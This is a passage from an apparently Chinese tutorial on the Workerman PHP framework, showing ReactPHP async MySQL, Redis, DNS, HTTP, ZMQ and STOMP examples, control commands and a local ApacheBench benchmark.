</code><code>});</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;onMessage = </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$data</code><code>) {</code></p>\n\n\t\t\t<p><code>    </code><code>global</code> <code>$mysql</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>$mysql</code><code>-&gt;query(</code><code>'show databases'</code> <code>/*trim($data)*/</code><code>, </code><code>function</code> <code>(</code><code>$command</code><code>, </code><code>$mysql</code><code>) </code><code>use</code> <code>(</code><code>$connection</code><code>) {</code></p>\n\n\t\t\t<p><code>        </code><code>if</code> <code>(</code><code>$command</code><code>-&gt;hasError()) {</code></p>\n\n\t\t\t<p><code>            </code><code>$error</code> <code>= </code><code>$command</code><code>-&gt;getError();</code></p>\n\n\t\t\t<p><code>        </code><code>} </code><code>else</code> <code>{</code></p>\n\n\t\t\t<p><code>            </code><code>$results</code> <code>= </code><code>$command</code><code>-&gt;resultRows;</code></p>\n\n\t\t\t<p><code>            </code><code>$fields</code>  <code>= </code><code>$command</code><code>-&gt;resultFields;</code></p>\n\n\t\t\t<p><code>            </code><code>$connection</code><code>-&gt;send(json_encode(</code><code>$results</code><code>));</code></p>\n\n\t\t\t<p><code>        </code><code>}</code></p>\n\n\t\t\t<p><code>    </code><code>});</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>ReactPHP的Async Redis</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>composer </code><code>require</code> <code>clue/redis-react</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\n\t\t\t<p>29</p>\n\n\t\t\t<p>30</p>\n\n\t\t\t<p>31</p>\n\n\t\t\t<p>32</p>\n\n\t\t\t<p>33</p>\n\n\t\t\t<p>34</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>&lt;?php</code></p>\n\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Clue\\React\\Redis\\Factory;</code></p>\n\n\t\t\t<p><code>use</code> <code>Clue\\React\\Redis\\Client;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>'tcp://0.0.0.0:6161'</code><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;onWorkerStart = </code><code>function</code><code>() {</code></p>\n\n\t\t\t<p><code>    </code><code>global</code> <code>$factory</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>$loop</code>    <code>= Worker::getEventLoop();</code></p>\n\n\t\t\t<p><code>    </code><code>$factory</code> <code>= </code><code>new</code> <code>Factory(</code><code>$loop</code><code>);</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;onMessage = </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$data</code><code>) {</code></p>\n\n\t\t\t<p><code>    </code><code>global</code> <code>$factory</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>$factory</code><code>-&gt;createClient(</code><code>'localhost:6379'</code><code>)-&gt;then(</code><code>function</code> <code>(Client </code><code>$client</code><code>) </code><code>use</code> <code>(</code><code>$connection</code><code>) {</code></p>\n\n\t\t\t<p><code>        </code><code>$client</code><code>-&gt;set(</code><code>'greeting'</code><code>, </code><code>'Hello world'</code><code>);</code></p>\n\n\t\t\t<p><code>        </code><code>$client</code><code>-&gt;append(</code><code>'greeting'</code><code>, </code><code>'!'</code><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>        </code><code>$client</code><code>-&gt;get(</code><code>'greeting'</code><code>)-&gt;then(</code><code>function</code> <code>(</code><code>$greeting</code><code>) </code><code>use</code> <code>(</code><code>$connection</code><code>){</code></p>\n\n\t\t\t<p><code>            </code><code>// Hello world!</code></p>\n\n\t\t\t<p><code>            </code><code>echo</code> <code>$greeting</code> <code>. PHP_EOL;</code></p>\n\n\t\t\t<p><code>            </code><code>$connection</code><code>-&gt;send(</code><code>$greeting</code><code>);</code></p>\n\n\t\t\t<p><code>        </code><code>});</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>        </code><code>$client</code><code>-&gt;incr(</code><code>'invocation'</code><code>)-&gt;then(</code><code>function</code> <code>(</code><code>$n</code><code>) </code><code>use</code> <code>(</code><code>$connection</code><code>){</code></p>\n\n\t\t\t<p><code>            </code><code>echo</code> <code>'This is invocation #'</code> <code>. </code><code>$n</code> <code>. PHP_EOL;</code></p>\n\n\t\t\t<p><code>            </code><code>$connection</code><code>-&gt;send(</code><code>$n</code><code>);</code></p>\n\n\t\t\t<p><code>        </code><code>});</code></p>\n\n\t\t\t<p><code>    </code><code>});</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>Aysnc dns的ReactPHP</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>composer </code><code>require</code> <code>react/dns</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p><code>$worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>'tcp://0.0.0.0:6161'</code><code>);</code></p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;onWorkerStart = </code><code>function</code><code>() {</code></p>\n\n\t\t\t<p><code>    </code><code>global</code>   <code>$dns</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>// Get event-loop.</code></p>\n\n\t\t\t<p><code>    </code><code>$loop</code>    <code>= Worker::getEventLoop();</code></p>\n\n\t\t\t<p><code>    </code><code>$factory</code> <code>= </code><code>new</code> <code>React\\Dns\\Resolver\\Factory();</code></p>\n\n\t\t\t<p><code>    </code><code>$dns</code>     <code>= </code><code>$factory</code><code>-&gt;create(</code><code>'8.8.8.8'</code><code>, </code><code>$loop</code><code>);</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;onMessage = </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$host</code><code>) {</code></p>\n\n\t\t\t<p><code>    </code><code>global</code> <code>$dns</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>$host</code> <code>= trim(</code><code>$host</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>$dns</code><code>-&gt;resolve(</code><code>$host</code><code>)-&gt;then(</code><code>function</code><code>(</code><code>$ip</code><code>) </code><code>use</code><code>(</code><code>$host</code><code>, </code><code>$connection</code><code>) {</code></p>\n\n\t\t\t<p><code>        </code><code>$connection</code><code>-&gt;send(</code><code>\"$host: $ip\"</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>},</code><code>function</code><code>(</code><code>$e</code><code>) </code><code>use</code><code>(</code><code>$host</code><code>, </code><code>$connection</code><code>){</code></p>\n\n\t\t\t<p><code>        </code><code>$connection</code><code>-&gt;send(</code><code>\"$host: {$e-&gt;getMessage()}\"</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>});</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>ReactPHP的Http客户端</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>composer </code><code>require</code> <code>react/http-client</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>&lt;?php</code></p>\n\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>'tcp://0.0.0.0:6161'</code><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;onMessage = </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$host</code><code>) {</code></p>\n\n\t\t\t<p><code>    </code><code>$loop</code>    <code>= Worker::getEventLoop();</code></p>\n\n\t\t\t<p><code>    </code><code>$client</code>  <code>= </code><code>new</code> <code>\\React\\HttpClient\\Client(</code><code>$loop</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>$request</code> <code>= </code><code>$client</code><code>-&gt;request(</code><code>'GET'</code><code>, trim(</code><code>$host</code><code>));</code></p>\n\n\t\t\t<p><code>    </code><code>$request</code><code>-&gt;on(</code><code>'error'</code><code>, </code><code>function</code><code>(Exception </code><code>$e</code><code>) </code><code>use</code> <code>(</code><code>$connection</code><code>) {</code></p>\n\n\t\t\t<p><code>        </code><code>$connection</code><code>-&gt;send(</code><code>$e</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>});</code></p>\n\n\t\t\t<p><code>    </code><code>$request</code><code>-&gt;on(</code><code>'response'</code><code>, </code><code>function</code> <code>(</code><code>$response</code><code>) </code><code>use</code> <code>(</code><code>$connection</code><code>) {</code></p>\n\n\t\t\t<p><code>        </code><code>$response</code><code>-&gt;on(</code><code>'data'</code><code>, </code><code>function</code> <code>(</code><code>$data</code><code>) </code><code>use</code> <code>(</code><code>$connection</code><code>) {</code></p>\n\n\t\t\t<p><code>            </code><code>$connection</code><code>-&gt;send(</code><code>$data</code><code>);</code></p>\n\n\t\t\t<p><code>        </code><code>});</code></p>\n\n\t\t\t<p><code>    </code><code>});</code></p>\n\n\t\t\t<p><code>    </code><code>$request</code><code>-&gt;</code><code>end</code><code>();</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>ReactPHP的ZMQ</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>composer </code><code>require</code> <code>react/zmq</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>&lt;?php</code></p>\n\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p><code>$worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>'text://0.0.0.0:6161'</code><code>);</code></p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;onWorkerStart = </code><code>function</code><code>() {</code></p>\n\n\t\t\t<p><code>    </code><code>global</code>   <code>$pull</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>$loop</code>    <code>= Worker::getEventLoop();</code></p>\n\n\t\t\t<p><code>    </code><code>$context</code> <code>= </code><code>new</code> <code>React\\ZMQ\\Context(</code><code>$loop</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>$pull</code>    <code>= </code><code>$context</code><code>-&gt;getSocket(ZMQ::SOCKET_PULL);</code></p>\n\n\t\t\t<p><code>    </code><code>$pull</code><code>-&gt;bind(</code><code>'tcp://127.0.0.1:5555'</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>$pull</code><code>-&gt;on(</code><code>'error'</code><code>, </code><code>function</code> <code>(</code><code>$e</code><code>) {</code></p>\n\n\t\t\t<p><code>        </code><code>var_dump(</code><code>$e</code><code>-&gt;getMessage());</code></p>\n\n\t\t\t<p><code>    </code><code>});</code></p>\n\n\t\t\t<p><code>    </code><code>$pull</code><code>-&gt;on(</code><code>'message'</code><code>, </code><code>function</code> <code>(</code><code>$msg</code><code>) {</code></p>\n\n\t\t\t<p><code>        </code><code>echo</code> <code>\"Received: $msg\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>});</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>react的STOMP</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>composer </code><code>require</code> <code>react/stomp</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>&lt;?php</code></p>\n\n\t\t\t<p><code>require_once</code> <code>__DIR__ . </code><code>'/vendor/autoload.php'</code><code>;</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>'text://0.0.0.0:6161'</code><code>);</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;onWorkerStart = </code><code>function</code><code>() {</code></p>\n\n\t\t\t<p><code>    </code><code>global</code>   <code>$client</code><code>;</code></p>\n\n\t\t\t<p><code>    </code><code>$loop</code>    <code>= Worker::getEventLoop();</code></p>\n\n\t\t\t<p><code>    </code><code>$factory</code> <code>= </code><code>new</code> <code>React\\Stomp\\Factory(</code><code>$loop</code><code>);</code></p>\n\n\t\t\t<p><code>    </code><code>$client</code>  <code>= </code><code>$factory</code><code>-&gt;createClient(</code><code>array</code><code>(</code><code>'vhost'</code> <code>=&gt; </code><code>'/'</code><code>, </code><code>'login'</code> <code>=&gt; </code><code>'guest'</code><code>, </code><code>'passcode'</code> <code>=&gt; </code><code>'guest'</code><code>));</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>    </code><code>$client</code></p>\n\n\t\t\t<p><code>        </code><code>-&gt;connect()</code></p>\n\n\t\t\t<p><code>        </code><code>-&gt;then(</code><code>function</code> <code>(</code><code>$client</code><code>) </code><code>use</code> <code>(</code><code>$loop</code><code>) {</code></p>\n\n\t\t\t<p><code>            </code><code>$client</code><code>-&gt;subscribe(</code><code>'/topic/foo'</code><code>, </code><code>function</code> <code>(</code><code>$frame</code><code>) {</code></p>\n\n\t\t\t<p><code>                </code><code>echo</code> <code>\"Message received: {$frame-&gt;body}\\n\"</code><code>;</code></p>\n\n\t\t\t<p><code>            </code><code>});</code></p>\n\n\t\t\t<p><code>        </code><code>});</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>可用命令</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>php start.php start </code></p>\n\n\t\t\t<p><code>php start.php start -d</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><img alt=\"e98162e9c0fdc68f6806079d39791cf.png\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcucGhwLmNuL3VwbG9hZC9pbWFnZS8zODcvMjY1LzMwMS8xNTUzMDQ3MjMxNTQxNjAwLnBuZw?x-oss-process=image/format,png\"></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>php start.php status [object Object]</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>php start.php connections</code></p>\n\n\t\t\t<p><code>php start.php stop </code></p>\n\n\t\t\t<p><code>php start.php restart </code></p>\n\n\t\t\t<p><code>php start.php reload</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>基准</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>CPU:      Intel(R) Core(TM) i3-3220 CPU @ 3.30GHz </code><code>and</code> <code>4 processors totally</code></p>\n\n\t\t\t<p><code>Memory:   8G</code></p>\n\n\t\t\t<p><code>OS:       Ubuntu 14.04 LTS</code></p>\n\n\t\t\t<p><code>Software: ab</code></p>\n\n\t\t\t<p><code>PHP:      5.5.9</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>代码</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>&lt;?php</code></p>\n\n\t\t\t<p><code>use</code> <code>Workerman\\Worker;</code></p>\n\n\t\t\t<p><code>$worker</code> <code>= </code><code>new</code> <code>Worker(</code><code>'tcp://0.0.0.0:1234'</code><code>);</code></p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;</code><code>count</code><code>=3;</code></p>\n\n\t\t\t<p><code>$worker</code><code>-&gt;onMessage = </code><code>function</code><code>(</code><code>$connection</code><code>, </code><code>$data</code><code>)</code></p>\n\n\t\t\t<p><code>{</code></p>\n\n\t\t\t<p><code>    </code><code>$connection</code><code>-&gt;send(</code><code>\"HTTP/1.1 200 OK\\r\\nConnection: keep-alive\\r\\nServer: workerman\\r\\nContent-Length: 5\\r\\n\\r\\nhello\"</code><code>);</code></p>\n\n\t\t\t<p><code>};</code></p>\n\n\t\t\t<p><code>Worker::runAll();</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p><strong>结果</strong></p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\n\t\t\t<p>29</p>\n\n\t\t\t<p>30</p>\n\n\t\t\t<p>31</p>\n\n\t\t\t<p>32</p>\n\n\t\t\t<p>33</p>\n\n\t\t\t<p>34</p>\n\n\t\t\t<p>35</p>\n\n\t\t\t<p>36</p>\n\n\t\t\t<p>37</p>\n\n\t\t\t<p>38</p>\n\n\t\t\t<p>39</p>\n\n\t\t\t<p>40</p>\n\n\t\t\t<p>41</p>\n\n\t\t\t<p>42</p>\n\n\t\t\t<p>43</p>\n\n\t\t\t<p>44</p>\n\n\t\t\t<p>45</p>\n\n\t\t\t<p>46</p>\n\n\t\t\t<p>47</p>\n\n\t\t\t<p>48</p>\n\n\t\t\t<p>49</p>\n\n\t\t\t<p>50</p>\n\n\t\t\t<p>51</p>\n\n\t\t\t<p>52</p>\n\n\t\t\t<p>53</p>\n\n\t\t\t<p>54</p>\n\n\t\t\t<p>55</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>ab -n1000000 -c100 -k http:</code><code>//127.0.0.1:1234/</code></p>\n\n\t\t\t<p><code>This is ApacheBench, Version 2.3 &lt;</code><code>$Revision</code><code>: 1528965 $&gt;</code></p>\n\n\t\t\t<p><code>Copyright 1996 Adam Twiss, Zeus Technology Ltd, http:</code><code>//www.zeustech.net/</code></p>\n\n\t\t\t<p><code>Licensed to The Apache Software Foundation, http:</code><code>//www.apache.org/</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Benchmarking 127.0.0.1 (be patient)</code></p>\n\n\t\t\t<p><code>Completed 100000 requests</code></p>\n\n\t\t\t<p><code>Completed 200000 requests</code></p>\n\n\t\t\t<p><code>Completed 300000 requests</code></p>\n\n\t\t\t<p><code>Completed 400000 requests</code></p>\n\n\t\t\t<p><code>Completed 500000 requests</code></p>\n\n\t\t\t<p><code>Completed 600000 requests</code></p>\n\n\t\t\t<p><code>Completed 700000 requests</code></p>\n\n\t\t\t<p><code>Completed 800000 requests</code></p>\n\n\t\t\t<p><code>Completed 900000 requests</code></p>\n\n\t\t\t<p><code>Completed 1000000 requests</code></p>\n\n\t\t\t<p><code>Finished 1000000 requests</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Server Software:        workerman/3.1.4</code></p>\n\n\t\t\t<p><code>Server Hostname:        127.0.0.1</code></p>\n\n\t\t\t<p><code>Server Port:            1234</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Document Path:          /</code></p>\n\n\t\t\t<p><code>Document Length:        5 bytes</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Concurrency Level:      100</code></p>\n\n\t\t\t<p><code>Time taken </code><code>for</code> <code>tests:   7.240 seconds</code></p>\n\n\t\t\t<p><code>Complete requests:      1000000</code></p>\n\n\t\t\t<p><code>Failed requests:        0</code></p>\n\n\t\t\t<p><code>Keep-Alive requests:    1000000</code></p>\n\n\t\t\t<p><code>Total transferred:      73000000 bytes</code></p>\n\n\t\t\t<p><code>HTML transferred:       5000000 bytes</code></p>\n\n\t\t\t<p><code>Requests per second:    138124.14 [#/sec] (mean)</code></p>\n\n\t\t\t<p><code>Time per request:       0.724 [ms] (mean)</code></p>\n\n\t\t\t<p><code>Time per request:       0.007 [ms] (mean, across all concurrent requests)</code></p>\n\n\t\t\t<p><code>Transfer rate:          9846.74 [Kbytes/sec] received</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Connection Times (ms)</code></p>\n\n\t\t\t<p><code>              </code><code>min  mean[+/-sd] median   max</code></p>\n\n\t\t\t<p><code>Connect:        0    0   0.0      0       5</code></p>\n\n\t\t\t<p><code>Processing:     0    1   0.2      1       9</code></p>\n\n\t\t\t<p><code>Waiting:        0    1   0.2      1       9</code></p>\n\n\t\t\t<p><code>Total:          0    1   0.2      1       9</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code>Percentage of the requests served within a certain time (ms)</code></p>\n\n\t\t\t<p><code>  </code><code>50%      1</code></p>\n\n\t\t\t<p><code>  </code><code>66%      1</code></p>\n\n\t\t\t<p><code>  </code><code>75%      1</code></p>\n\n\t\t\t<p><code>  </code><code>80%      1</code></p>\n\n\t\t\t<p><code>  </code><code>90%      1</code></p>\n\n\t\t\t<p><code>  </code><code>95%      1</code></p>\n\n\t\t\t<p><code>  </code><code>98%      1</code></p>\n\n\t\t\t<p><code>  </code><code>99%      1</code></p>\n\n\t\t\t<p><code> </code><code>100%      9 (longest request)</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>本篇文章就是关于workerman的相关介绍，希望对需要的朋友有所帮助！</p>\n                                    </div>", "log_PostTime": 1584891201, "log_Meta": ""}
